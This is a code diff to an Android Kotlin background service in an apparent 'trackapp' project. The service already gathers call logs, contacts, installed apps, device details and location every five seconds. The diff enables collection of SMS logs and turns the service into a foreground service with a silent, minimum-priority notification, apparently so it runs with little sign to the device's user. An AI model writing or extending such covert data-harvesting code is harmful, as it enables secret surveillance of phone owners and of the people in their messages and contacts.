@@ -2,10 +2,12 @@ package com.wahyu.trackapp
 
 import android.Manifest
 import android.annotation.SuppressLint
-import android.app.Service
+import android.app.*
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.graphics.Color
 import android.net.Uri
 import android.os.Build
 import android.os.IBinder
@@ -13,7 +15,10 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Settings
 import android.util.Log
+import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
+import androidx.core.app.NotificationCompat.PRIORITY_MIN
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
 import com.google.gson.Gson
@@ -25,6 +30,8 @@ class AppService : Service() {
 
     private val TAG: String = "AppService"
     private lateinit var fusedLocationClient: FusedLocationProviderClient
+    private val NOTIF_ID = 1
+    private val NOTIF_CHANNEL_ID = "Channel_Id"
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "--> Service Started")
@@ -37,6 +44,8 @@ class AppService : Service() {
             }
         },0, 5000L)
 
+        startForeground()
+
 
         return super.onStartCommand(intent, flags, startId)
     }
@@ -48,6 +57,36 @@ class AppService : Service() {
 
     override fun onBind(p0: Intent?): IBinder? {
         return null
+    }
+
+    private fun startForeground() {
+        val channelId =
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                createNotificationChannel("my_service", "My Background Service")
+            } else {
+                // If earlier version channel ID is not used
+                // https://developer.android.com/reference/android/support/v4/app/NotificationCompat.Builder.html#NotificationCompat.Builder(android.content.Context)
+                ""
+            }
+
+        val notificationBuilder = NotificationCompat.Builder(this, channelId )
+        val notification = notificationBuilder.setOngoing(true)
+            .setSmallIcon(R.mipmap.ic_launcher)
+            .setPriority(PRIORITY_MIN)
+            .setCategory(Notification.CATEGORY_SERVICE)
+            .build()
+        startForeground(101, notification)
+    }
+
+    @RequiresApi(Build.VERSION_CODES.O)
+    private fun createNotificationChannel(channelId: String, channelName: String): String{
+        val chan = NotificationChannel(channelId,
+            channelName, NotificationManager.IMPORTANCE_NONE)
+        chan.lightColor = Color.BLUE
+        chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
+        val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        service.createNotificationChannel(chan)
+        return channelId
     }
 
     private fun makeModel() {
@@ -66,7 +105,7 @@ class AppService : Service() {
                 Log.d(TAG, "location --> ${Gson().toJson(it)}")
             }
 
-//        val smsLogs = getSMSLogs()
+        val smsLogs = getSMSLogs()
         val location = "Tangerang"
         val callLogs = Gson().toJson(getCallLogs())
         val listContact = Gson().toJson(getNamePhoneDetails())
@@ -76,7 +115,7 @@ class AppService : Service() {
             location = location,
             deviceInfo = getSystemDetail(),
             callLogs = callLogs,
-            smsLogs = "smsLogs",
+            smsLogs = smsLogs,
             listContact = listContact,
             appsDownloaded = appsInstalled
         )
